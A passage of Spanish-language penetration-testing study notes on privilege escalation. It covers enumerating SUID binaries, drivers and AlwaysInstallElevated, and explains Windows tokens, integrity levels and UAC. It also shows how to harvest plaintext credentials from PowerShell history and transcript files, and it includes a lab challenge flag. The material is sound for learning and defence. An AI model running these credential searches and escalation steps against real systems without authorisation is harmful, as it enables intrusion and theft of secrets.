debugfs on /sys/kernel/debug type debugfs (rw,relatime)
tmpfs on /run/user/110 type tmpfs (rw,nosuid,nodev,relatime,size=102904k,mode=700,uid=
gvfsd-fuse on /run/user/110/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_i
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=102904k,mode=700,uid
```

Y podemos complementar la información con **/bin/lsblk**:

```
student@debian:~$ /bin/lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
fd0      2:0    1    4K  0 disk 
sda      8:0    0    5G  0 disk 
├─sda1   8:1    0  4.7G  0 part /
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0  334M  0 part [SWAP]
```

La información conjunta de las tres utilidades anteriores revela la existencia de una partición SWAP en /dev/sda5.

<br />

##### 1.1.11. Enumerating Device Drivers and Kernel Modules (driverquery, Get-WmiObject, ).

Otro vector de PrivEsc consiste en sacar partirdo de modulos del kernel o dispositivos drivers, estos no son más que dispositivos que guían al software para que puedan comunicarse eficientemente con el hardware. Fundamentalmente nos interesa obtener una lista de los dispositivos que están instalados en el sistema.

- En sistemas Windows podemos empezar utilizando **driverquery.exe**:

```
c:\Users\student>powershell

PS C:\Users\student> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path

Display Name                         Start Mode Path
------------                         ---------- ----
1394 OHCI Compliant Host Controller  Manual     C:\Windows\system32\drivers\1394ohci.s
3ware                                Manual     C:\Windows\system32\drivers\3ware.sys
Microsoft ACPI Driver                Boot       C:\Windows\system32\drivers\ACPI.sys
ACPI Devices driver                  Manual     C:\Windows\system32\drivers\AcpiDev.sy
Microsoft ACPIEx Driver              Boot       C:\Windows\system32\Drivers\acpiex.sys
ACPI Processor Aggregator Driver     Manual     C:\Windows\system32\drivers\acpipagr.s
ACPI Power Meter Driver              Manual     C:\Windows\system32\drivers\acpipmi.sy
ACPI Wake Alarm Driver               Manual     C:\Windows\system32\drivers\acpitime.s
ADP80XX                              Manual     C:\Windows\system32\drivers\ADP80XX.SY  
```

También podemos utilizar **Get-WmiObject** para cargar drivers con información detallada:

```
PS C:\Users\student> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

DeviceName               DriverVersion Manufacturer
----------               ------------- ------------
VMware VMCI Host Device  9.8.6.0       VMware, Inc.
VMware PVSCSI Controller 1.3.10.0      VMware, Inc.
VMware SVGA 3D           8.16.1.24     VMware, Inc.
VMware VMCI Bus Device   9.8.6.0       VMware, Inc.
VMware Pointing Device   12.5.7.0      VMware, Inc.
```

- En sistemas Linux por otra parte podemos cargar los drivers con:

```
student@debian:~$ lsmod
Module                  Size  Used by
fuse                   90112  3
appletalk              32768  0
ax25                   49152  0
ipx                    28672  0
p8023                  16384  1 ipx
p8022                  16384  1 ipx
psnap                  16384  2 appletalk,ipx
llc                    16384  2 p8022,psnap
evdev                  20480  5
vmw_balloon            20480  0
crc32_pclmul           16384  0
...
i2c_piix4              20480  0
libata                192512  2 ata_piix,ata_generic
scsi_mod              180224  4 sd_mod,libata,sg,vmw_pvscsi
floppy                 57344  0
```

Una vez hemos localizado un modulo que nos llame la atención podems obtener más información sobre este con **modinfo**

```
student@debian:~$ /sbin/modinfo libata
filename:       /lib/modules/4.9.0-6-686/kernel/drivers/ata/libata.ko
version:        3.00
license:        GPL
description:    Library module for ATA devices
author:         Jeff Garzik
srcversion:     7D8076C4A3FEBA6219DD851
depends:        scsi_mod
retpoline:      Y
intree:         Y
vermagic:       4.9.0-6-686 SMP mod_unload modversions 686
parm:           zpodd_poweroff_delay:Poweroff delay for ZPODD in seconds (int)
...
```

<br />

##### 1.1.12. Enumerating Binaries That AutoElevate.

Primero, en los sistemas Windows, debemos verificar el estado de la configuración del registro *AlwaysInstallElevated*. Si esta clave está habilitada (establecida en 1) en HKEY_CURRENT_USER o HKEY_LOCAL_MACHINE, cualquier usuario puede ejecutar paquetes de Windows Installer con privilegios elevados.

Podemos usar la consulta de registro para verificar estas configuraciones:

```
c:\Users\student>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


c:\Users\student>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Si esta configuración está habilitada, podríamos crear un archivo _MSI_ y ejecutarlo para elevar nuestros privilegios.

Del mismo modo, en sistemas basados ​​en Linux podemos buscar archivos SUID.

Normalmente, al ejecutar un ejecutable, hereda los permisos del usuario que lo ejecuta. Sin embargo, si se establecen los permisos SUID, el binario se ejecutará con los permisos del propietario del archivo. Esto significa que si un binario tiene el bit SUID establecido y el archivo es propiedad de root, cualquier usuario local podrá ejecutar ese binario con privilegios elevados.

Podemos usar el comando de búsqueda para buscar binarios marcados con SUID. En este caso, estamos comenzando nuestra búsqueda en el directorio raíz ( / ), buscando archivos ( -type f ) con el bit SUID establecido, ( -perm -u=s ) y descartando todos los mensajes de error ( 2>/dev/null ):

```
student@debian:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/userhelper
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chsh
/bin/moun
/bin/su
/bin/fusermoun
/bin/umoun
/bin/ntfs-3g
/bin/ping
```

En este caso, el comando encontró varios binarios SUID. La explotación de los binarios SUID variará en función de varios factores. Por ejemplo, si /bin/cp (el comando *copy* ) fuera SUID, podríamos copiar y sobrescribir archivos confidenciales como /etc/passwd .
#### 1.2. Practice - Manual Enumeration.

**2. To solve this challenge, you need to enumerate the target VM #1, to help you determine the best approach for privilege escalation. To do so, you need to answer the questions by launching the linux_enum binary in the /challenge folder and get the flag.**

```
./linux_enum 
 What is your UID?
1000
Who is the secondary (i.e. only other non-system) username on the system?
student
What is the name of the Operating System (base name not pretty name)?
Kali GNU/Linux        
What is the architecture? (include, if necessary, the underscore in the answer)
x86_64
Correct! The flag is: OS{dc4755aed273ddb041c9ae27c640053a}
```


#### 1.3. Automated Enumeration.

A pesar de ser lo más eficaz, la enumeración manual puede consumir mucho tiempo y nos interesa ser sobretodo eficientes con lo qu een muchas ocasiones debemos complementar cierto grado de exploración manual con herramientas de enumeración automatizadas.

- En sistemas Windows uno de los scripts es [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check) 

```
c:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check2.exe -h
windows-privesc-check v2.0 (http://pentestmonkey.net/windows-privesc-check)

Usage: windows_privesc_check.exe (--dump [ dump opts] | --dumptab | --audit) [examine opts] [host opts] -o report-file-stem

Options:
  --version             show program's version number and exi
  -h, --help            show this help message and exit
  --dump                Dumps info for you to analyse manually
  --dumptab             Dumps info in tab-delimited format
  --audit               Identify and report security weaknesses
  --pyshell             Start interactive python shell

  examine opts:
    At least one of these to indicate what to examine (*=not implemented)

    -a, --all           All Simple Checks (non-slow)
    -A, --allfiles      All Files and Directories (slow)
    -D, --drives        Drives
    -e, --reg_keys      Misc security-related reg keys
    -E, --eventlogs     Event Log*
    -f INTERESTING_FILE_LIST, --interestingfiledir=INTERESTING_FILE_LIST
                        Changes -A behaviour.  Look here INSTEAD
    -F INTERESTING_FILE_FILE, --interestingfilefile=INTERESTING_FILE_FILE
                        Changes -A behaviour.  Look here INSTEAD.  On dir per
                        line
    -G, --groups        Groups
    -H, --shares        Shares
    -I, --installed_software
                        Installed Software
    -j, --tasks         Scheduled Tasks
    -k, --drivers       Kernel Drivers
...
```

Así por ejemplo, podemos ejecutar el binario junto con las opciones *--dump*, *--G* para mostrar todos los grupos presentes en el sistema:

```
c:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check2.exe --dump -G
windows-privesc-check v2.0 (http://pentestmonkey.net/windows-privesc-check)

[i] TSUserEnabled registry value is 0. Excluding TERMINAL SERVER USER

Considering these users to be trusted:
* BUILTIN\Power Users
* BUILTIN\Administrators
* NT SERVICE\TrustedInstaller
* NT AUTHORITY\SYSTEM

[i] Running as current user.  No logon creds supplied (-u, -D, -p).
...
============ Starting Audit at 2019-09-22 12:45:56 ============

[+] Running: dump_misc_checks
[+] Host is not in domain
 [+] Checks completed

[+] Running: dump_groups
[+] Dumping group list:
BUILTIN\Administrators has member: CLIENT251\Administrator
BUILTIN\Administrators has member: CLIENT251\admin
BUILTIN\Administrators has member: [unknown]\S-1-5-21-2715734670-1758985447-1278008508
BUILTIN\Administrators has member: [unknown]\S-1-5-21-2715734670-1758985447-1278008508
BUILTIN\Guests has member: CLIENT251\Guest
BUILTIN\IIS_IUSRS has member: NT AUTHORITY\IUSR
BUILTIN\Remote Desktop Users has member: CLIENT251\student
BUILTIN\Users has member: NT AUTHORITY\INTERACTIVE
BUILTIN\Users has member: NT AUTHORITY\Authenticated Users
BUILTIN\Users has member: CLIENT251\student
BUILTIN\Users has member: [unknown]\S-1-5-21-2715734670-1758985447-1278008508-513
[+] Checks completed
```


- En sistemas Unix, podemos utilizar un script parecido denominado [unix_privesc_check](https://github.com/pentestmonkey/unix-privesc-check)

```
student@debian:~$./unix-privesc-check
unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )

Usage: unix-privesc-check { standard | detailed }

"standard" mode: Speed-optimised check of lots of security settings.

"detailed" mode: Same as standard mode, but also checks perms of open file
                 handles and called files (e.g. parsed from shell scripts,
                 linked .so files).  This mode is slow and prone to false 
                 positives but might help you find more subtle flaws in 3rd
                 party programs.

This script checks file permissions and other settings that could allow
local users to escalate privileges.
...
```

Como se muestra en la lista anterior, el script admite el modo "estándar" y "detallado". Según la información proporcionada, el modo estándar parece realizar un proceso de velocidad optimizada y debería proporcionar una cantidad reducida de falsos positivos. Por lo tanto, en el siguiente ejemplo usaremos el modo estándar y redirigiremos toda la salida a un archivo llamado salida.txt .

```
student@debian:~$ ./unix-privesc-check standard > output.txt
```

El script realiza numerosas comprobaciones de permisos en archivos comunes. Por ejemplo, el siguiente extracto revela archivos de configuración en los que pueden escribir usuarios no root:

```
Checking for writable config files
############################################
    Checking if anyone except root can change /etc/passwd
WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
    Checking if anyone except root can change /etc/group
    Checking if anyone except root can change /etc/fstab
    Checking if anyone except root can change /etc/profile
    Checking if anyone except root can change /etc/sudoers
    Checking if anyone except root can change /etc/shadow
```


¡Esta salida revela que cualquier persona en el sistema puede editar el archivo /etc/passwd ! Esto es bastante significativo ya que permite a los atacantes elevar fácilmente sus privilegios o crear cuentas de usuario en el objetivo. Demostraremos esto más adelante en el módulo.

Si bien estas herramientas realizan muchas comprobaciones automatizadas, tenga en cuenta que cada sistema es diferente y que estos tipos de herramientas a menudo pasarán por alto los cambios únicos del sistema. Por esta razón, es importante tener cuidado con las configuraciones únicas que solo pueden detectarse mediante una inspección manual.

### 2. Windows Privilege Escalation.
#### 2.1. Enumerating Windows.
##### 2.1.1. Understanding Windows Privileges and Access Control Mechanisms.

**Definición de privilegios**

*Privilegios* de una cuenta en un sistema Windows es un término que refiere a los permisos que definen el límite de las operaciones que dicha cuenta puede realizar localmente en el sistema.

Para volver efectivos en un sentido práctico estos privilegios, los sistemas Windows usan *objetos de acceso* denominados *Tokens*. Esto funciona de la siguiente forma, cuando un usuario se logea, el sistema genera un token de acceso que se asigna a dicho usuario. Este token se construye con una arquitectura que describe el contexto de seguridad del usuario propietario del token en forma de piezas de información.

Estos tokens necesitan ser unívocamente identificables. Para este fin se emplea el SID (Security IDentifier) que es un valor númerico único generado por el Windows Local Security Authority.

La representación del SID consta de cuatro partes diferenciadas:

```
S-R-X-Y
```

- La letra S identifica la cadena de caracteres como un SID.
- La letra R viene de "revision" y está seteado a 1 (debido a que la estructura del SID sigue en desarrollo).
- La letra X determina la entidad autorizada que emite el SID. Así por ejemplo, el valor '5' referencia al *NT Authority*, muy común en sistemas locales.
- La letra "Y" representa las subautoridades de la autoridad del identificador. Cada SID consta de una o más subautoridades. Esta parte consta del identificador de dominio y el identificador relativo (RID). El identificador de dominio es el SID del dominio para los usuarios del dominio, el SID de la máquina local para los usuarios locales y "32" para los principales integrados. El RID determina principales como usuarios o grupos.

De esta forma, cada SID determina los permisos de una cuenta en el sistema, algunos ejemplos son los siguientes:

```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

Así, una vez que un usuario se logea en el sistema bajo una cuenta autorizada el sistema le otorga, según la cuenta sobre la que se haya registrado, un token de acceso.

El token en sí contiene varias piezas de información que describen el _contexto de seguridad_ de un usuario determinado. El contexto de seguridad es un conjunto de reglas o atributos que están actualmente en vigor.

El contexto de seguridad de un token consta:

- del SID del usuario
- los SID de los grupos de los que el usuario es miembro
- los privilegios del usuario y del grupo
- más información que describe el alcance del token.

Cuando un usuario inicia un proceso o subproceso se asignará un token a estos objetos. Este token, denominado *primary token*, es una copia del token de acceso del usuario y se dice que el proceso iniciado por dicha cuenta hereda los permisos de la cuenta en cuestión.

Un subproceso también puede tener asignado un _impersonation token_. Los tokens de suplantación se utilizan para proporcionar un contexto de seguridad diferente al del proceso propietario del subproceso. Esto significa que el subproceso interactúa con los objetos bajo el contexto de seguridad que el impersonation token define.

Además de los SID y tokens, Windows también implementa lo que se conoce como Mandatory Integrity Control. Utiliza *Integrity Levels* para controlar el acceso a objetos asegurables. Podemos pensar en estos niveles como jerarquías de confianza que Windows tiene en una aplicación en ejecución o un objeto asegurable.

Cuando se inician procesos o se crean objetos, estos reciben el nivel de integridad de la entidad que realiza esta operación. Una excepción es si un archivo ejecutable tiene un nivel de integridad bajo, el nivel de integridad del proceso también será bajo. Un principal con un nivel de integridad más bajo no puede escribir en un objeto con un nivel más alto, incluso si los permisos normalmente le permitirían hacerlo.

Así, entendemos que existen 4 niveles de integridad:

```
- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
```

Así, la seguridad en Windows se regula a través de marcos de seguridad asociados a las cuentas definidos por tokens y niveles de integridad asociados a objetos de forma que los niveles de seguridad tienen prioridad sobre los tokens. Esto es que si un administrador ejecuta un proceso con un nivel de integridad bajo, este proceso no puede interactuar por encima de procesos que tengan un nivel de integridad alto.

Así por ejemplo:

Los procesos de PowerShell tienen el nivel de integridad _Alto_ y _Medio_ . Al revisar el Listado 4, podemos inferir que el proceso de nivel de integridad _alto_ lo inicia el usuario administrativo y el proceso de nivel de integridad _medio_ lo inicia el usuario regular.

Un medio de control auxiliar a los dos mecanismos anteriores es el UAC, que previene que un software o aplicación ejecute acciones de con privilegios elevados sin consentimiento previo.

<br />

**Introduction to UAC**

El Control de cuentas de usuario (UAC) es un sistema de control de acceso introducido por Microsoft con Windows Vista y Windows Server 2008. Si bien el UAC se ha discutido e investigado durante mucho tiempo, es importante enfatizar que Microsoft no lo considera un límite de seguridad. Más bien, **UAC obliga a las aplicaciones y tareas a ejecutarse en el contexto de una cuenta no administrativa hasta que un administrador autorice el acceso elevado**. Bloqueará la ejecución de instaladores y aplicaciones no autorizadas sin los permisos de una cuenta administrativa y también bloqueará los cambios en la configuración del sistema. En general, **el efecto de UAC es que cualquier aplicación que desee realizar una operación con un impacto potencial en todo el sistema, no puede hacerlo de forma silenciosa. Al menos en teoría.**

También es importante resaltar el hecho de que UAC tiene dos modos diferentes: credential prompt y consent prompt. La diferencia es bastante simple. Cuando un usuario estándar desea realizar una tarea administrativa, como instalar una nueva aplicación, y UAC está habilitado, el usuario verá la solicitud de credenciales. En otras palabras, se requerirán las credenciales de un usuario administrativo para completar la tarea. Sin embargo, cuando un usuario administrativo intenta hacer lo mismo, se le presenta una solicitud de consentimiento. En este caso, el usuario simplemente tiene que confirmar que la tarea debe completarse y no es necesario volver a ingresar las credenciales de usuario.

Como ejemplo, en la siguiente figura, el CMD de Windows que se ejecuta con la cuenta de usuario estándar está intentando realizar una acción privilegiada. UAC actúa de acuerdo con su configuración (Always Notify en este caso), deteniendo el proceso de destino cmd.exe y solicitando un nombre de usuario y contraseña de administrador para realizar la acción privilegiada solicitada.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230310215750.png' | relative_url }}" text-align="center"/>
</div>

Incluso cuando haya iniciado sesión como usuario administrativo, la cuenta tendrá dos tokens de seguridad, uno que se ejecuta en un nivel de integridad medio y el otro en un nivel de integridad alto. UAC actúa como el mecanismo de separación entre esos dos niveles de integridad.

Para ver los niveles de integridad en acción, primero iniciemos sesión como usuario administrador, abramos un símbolo del sistema y ejecutemos el comando **whoami /groups**:

```
c:\Users\admin>whoami /groups

GROUP INFORMATION
-----------------

Group Name                              Type             SID          Attributes
======================================================== ============ ================
Everyone                                Well-known group S-1-1-0      Mandatory group,
NT AUTHORITY\Local account and member   Well-known group S-1-5-114    Group used for d
BUILTIN\Administrators                  Alias            S-1-5-32-544 Group used for d
BUILTIN\Users                           Alias            S-1-5-32-545 Mandatory group,
NT AUTHORITY\INTERACTIVE                Well-known group S-1-5-4      Mandatory group,
CONSOLE LOGON                           Well-known group S-1-2-1      Mandatory group,
NT AUTHORITY\Authenticated Users        Well-known group S-1-5-11     Mandatory group,
NT AUTHORITY\This Organization          Well-known group S-1-5-15     Mandatory group,
NT AUTHORITY\Local account              Well-known group S-1-5-113    Mandatory group,
LOCAL                                   Well-known group S-1-2-0      Mandatory group,
NT AUTHORITY\NTLM Authentication        Well-known group S-1-5-64-10  Mandatory group,
Mandatory Label\Medium Mandatory Level  Label            S-1-16-8192
```

Como se informó en la última línea de salida, este CMD está funcionando actualmente en un nivel de integridad Medio.

Intentemos cambiar la contraseña del usuario administrador desde este símbolo del sistema:

```
C:\Users\admin> net user admin Ev!lpass
System error 5 has occurred.

Access is denied.
```

La solicitud es denegada, a pesar de que estamos registrados como usuario administrativo.

*Para cambiar la contraseña del usuario administrador, debemos cambiar a un nivel de integridad alto incluso si iniciamos sesión con un usuario administrativo*. En nuestro ejemplo, una forma de hacerlo es a través de powershell.exe con el cmdlet *Start-Process* especificando la opción "Run as administrador":

```
C:\Users\admin>powershell.exe Start-Process cmd.exe -Verb runAs
```

Después de enviar este comando y aceptar el aviso de UAC, se nos presenta un nuevo proceso cmd.exe de alta integridad .

Verifiquemos nuestro nivel de integridad usando la utilidad whoami usando el argumento /groups e intentemos cambiar la contraseña nuevamente:

```
C:\Windows\system32> whoami /groups
GROUP INFORMATION
-----------------

Group Name                              Type             SID          Attributes
======================================================== ============ ================
Everyone                                Well-known group S-1-1-0      Mandatory group,
NT AUTHORITY\Local account and member   Well-known group S-1-5-114    Mandatory group,
BUILTIN\Administrators                  Alias            S-1-5-32-544 Mandatory group,
BUILTIN\Users                           Alias            S-1-5-32-545 Mandatory group,
NT AUTHORITY\INTERACTIVE                Well-known group S-1-5-4      Mandatory group,
CONSOLE LOGON                           Well-known group S-1-2-1      Mandatory group,
NT AUTHORITY\Authenticated Users        Well-known group S-1-5-11     Mandatory group,
NT AUTHORITY\This Organization          Well-known group S-1-5-15     Mandatory group,
NT AUTHORITY\Local account              Well-known group S-1-5-113    Mandatory group,
LOCAL                                   Well-known group S-1-2-0      Mandatory group,
NT AUTHORITY\NTLM Authentication        Well-known group S-1-5-64-10  Mandatory group,
Mandatory Label\High Mandatory Level    Label            S-1-16-12288

C:\Windows\system32> net user admin Ev!lpass
The command completed successfully.
```

Esta vez, estamos ejecutando un alto nivel de integridad y el cambio de contraseña es exitoso.

<br />

##### 2.1.2. Situational Awareness.

Ahora que entendemos cómo funcionan los permisos, antes de aprovecharnos de los mecanismos de Windows para elevar nuestros privilegios debemos tener cierta información para actuar de manera más precisa, al recopilar la mayor cantidad de información posible, obtienen información valiosa sobre el sistema de destino que pueden usar para crear varios vectores accionables para elevar sus privilegios.

Hay varias piezas clave de información que siempre debemos obtener:

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

Podemos obtener esta información y más siguiendo esta [guía](https://xorond.com/posts/2021/04/windows-local-privilege-escalation/). 

<br />

##### 2.1.3. Sensible information files.

Es muy importante repasar documentos de configuración o notas que puedan quedar por ahí ya que pueden contener información sensible

```
PS C:\Users\dave> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

<br />

```
PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

<br />

##### 2.1.4. Powershell Register Information.

En esta sección vamos a ver cómo PowerShell es una herramienta de recolección de información sensible sobre el sistema. 

Un elemento que puede contener información sensible sobre el usuario es su historial de comandos:

```
PS C:\Users\dave> Get-History
```

Puede ocurrir que este historial se encuentre vacío. La mayoría de los administradores utilizan el comando *Clear-History* para borrar el historial de PowerShell. Pero este cmdlet solo borra el historial de PowerShell, que se puede recuperar con _Get-History_ . A partir de PowerShell v5, v5.1 y v7, se incluye un módulo denominado *PSReadline*, que se utiliza para la edición de líneas y la funcionalidad del historial de comandos.

Curiosamente, Clear-History no borra el historial de comandos registrado por PSReadline. Por lo tanto, podemos comprobar si el usuario de nuestro ejemplo no entendió bien el Cmdlet Clear-History para borrar todos los rastros de los comandos anteriores.

Para recuperar el historial de PSReadline, podemos usar **Get-PSReadlineOption** para obtener información del módulo PSReadline. Lo ponemos entre paréntesis y agregamos **HistorySavePath** precedido de un punto. Esta sintaxis nos permite obtener solo una opción de todas las opciones disponibles del módulo.

```
PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
(Get-PSReadlineOption).HistorySavePath
C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt


PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
...
$PSVersionTable
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
cd C:
ls
cd C:\xampp
ls
type passwords.txt
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
exi
Stop-Transcript
```

Observemos que, en ese ejemplo:  Primero, _Dave_ ejecutó _Register-SecretVault_ con el módulo _SecretManagement.keepass_ , lo que implica que el usuario creó una nueva base de datos del administrador de contraseñas para KeePass. En la línea siguiente, _dave_ usó _Set-Secret_ para crear un secreto, o una entrada, en el administrador de contraseñas con el nombre _Server02 Admin PW_ y la contraseña _paperEarMonitor33@_ . Como sugiere el nombre, estas son probablemente credenciales para otro sistema. Sin embargo, debemos intentar aprovechar esta contraseña para cualquier usuario, servicio o inicio de sesión en CLIENTWK220, ya que el usuario puede reutilizarla. Por ahora, anotaremos la contraseña para más adelante y seguiremos analizando el historial. A continuación, el resultado muestra que _Dave_ usó _Clear-History_ creyendo que el historial se borra después de ejecutar el Cmdlet. Finalmente, _Dave_ usó _Start-Transcript_ para iniciar una transcripción de PowerShell. Este comando contiene la ruta donde se almacena el archivo de transcripción. Antes de examinarlo, analicemos también la siguiente línea.
 
El usuario ejecutó _Enter-PSSession_ con el nombre de host de la máquina local como argumento para _-ComputerName_ y un objeto _PSCredential_ _llamado $cred_ que contiene el nombre de usuario y la contraseña para _-Credential_ . Los comandos para crear el objeto PSCredential no están incluidos en el archivo de historial y, por lo tanto, no sabemos qué usuario y contraseña se usaron para _Enter-PSSession_ .

_PowerShell Remoting_ de forma predeterminada usa WinRM para Cmdlets como Enter-PSSession. Por lo tanto, un usuario debe estar en el grupo local _Usuarios de administración de Windows_ para ser un usuario válido para estos Cmdlets. Sin embargo, en lugar de WinRM, SSH también se puede usar para la comunicación remota de PowerShell. 

Además, Powershell dispone de dos herramientas de registro de información: *PowerShell Script Block Logging* y *PowerShell Transcription*.

- *PowerShell Transcription*: Esta a menudo se denomina como transcripción sobre el hombro porque el registro muestra información como si una persona estuviera mirando sobre el hombre del usuario cuya información está quedando registrada. Esta información queda almacenada en "transcript files" en un directorio compartido por los usuarios como C:\\Users\\Public o similar.

- *Script Block Logging*: Este sistema registra comandos y scripts como eventos mientras estos se ejecutan.

Ambos mecanismos son muy comunes y cada vez han adquirido más frecuencia en entornos empresariales siendon fundamentales de cara a la seguridad de la misma. Sin embargo y precisamente por esta misma razón, también pueden contener valiosa información para un potencial atacante.

Analicemos el archivo de transcripción en **C:\\Users\\Public\\Transcripts\\transcript01.txt** y verifiquemos si podemos arrojar más luz sobre el usuario y la contraseña en uso. Dado que la transcripción de PowerShell comenzó antes de que se ingresara Enter-PSSession, puede contener la información de la credencial en texto sin formato utilizada para crear el objeto PSCredential almacenado en la variable _$cred_ .

```
PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
type C:\Users\Public\Transcripts\transcript01.txt
**********************
Windows PowerShell transcript start
Start time: 20220623081143
Username: CLIENTWK220\dave
RunAs User: CLIENTWK220\dave
Configuration Name: 
Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process ID: 10336
PSVersion: 5.1.22000.282
...
**********************
Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
PS C:\Users\dave> Stop-Transcript
**********************
Windows PowerShell transcript end
End time: 20220623081221
**********************
```

Para crear el objeto PSCredential discutido anteriormente, un usuario primero debe crear un _SecureString_ para almacenar la contraseña. Luego, el usuario puede crear el objeto PSCredential con el nombre de usuario y la contraseña almacenada. La variable resultante, que contiene el objeto, se puede usar como argumento para _-Credential_ en comandos como Enter-PSSession.

Copiemos los tres comandos resaltados y péguelos en nuestro shell de enlace.

<br />

##### 2.1.5. Automated Enumeration.

Existen herramientas que nos permiten realizar una enumearción automática de un sistema Windows como WinPEAS.exe o PowerUP.ps1, un modulo de powershell que incluye cmdlets destinados a la enumeración de la máquina de una manera más sencilla.

<br />

#### 2.2. Leveraging Windows Services.

Ya hemos cubierto cómo sacar provecho de posibles despites que puedan dejar al descubierto información sensible como credenciales o versiones de programas vulnerables. 

Esta unidad de aprendizaje cubre los siguientes objetivos de aprendizaje:

- Hijack service binaries.
- Hijack service DLLs.
- Abuse Unquoted service paths.

Los servicios de Windows son una de las principales áreas a analizar cuando se buscan vectores de escalada de privilegios. En esta unidad de aprendizaje, revisaremos tres formas diferentes de elevar nuestros privilegios abusando de los servicios.

**Definición de Servicio en Windows**

En Windows, un servicio (Windows Service) es un binario ejecutándose en segundo plano gestionado por el Service Control Manager, (*long-running background executable*). Es muy simnilar al concepto de los *Daemons* en sistemas Unix.

Windows usa _LocalSystem_ (incluye los SID de _NT AUTHORITY\SYSTEM_ y _BUILTIN\\Administrators_ en su token), _Network Service_ y _Local Service_ cuentas de usuario para ejecutar sus propios servicios. Los usuarios o programas que crean un servicio pueden elegir una de esas cuentas, un usuario de dominio o un usuario local.

Los servicios de Windows son una de las principales áreas a analizar cuando se buscan vectores de escalada de privilegios. En esta unidad de aprendizaje, revisaremos tres formas diferentes de elevar nuestros privilegios abusando de los servicios.

<br />

##### 2.2.1. Service Binary Hijacking.

Como comentábamos antes, cada servicio tiene asociado un binario que se ejecuta cuando el servicio se inicia.

Si el sistema no está bien configurado, algún servicio manejado por una cuenta con privilegios superiores puede tener expuesto el binario con permisos de lectura/escritura. De esta forma, este binario o parte del contenido del mismo puede ser reescrito con malware que se procesa con una cuenta de privilegios superiores cuando se inicia el servicio. A esto  se le denomina como secuestro de binarios o Service Binary Hikacking.

Intentemos emular un caso práctico para ejemplificar el ejercicio. Supongámos que hemos conseguido acceso a una máquina. El primer paso es obtener una lista de los servicios instalados en el sistema:

```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                      State   PathName
----                      -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
...
mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
...
```

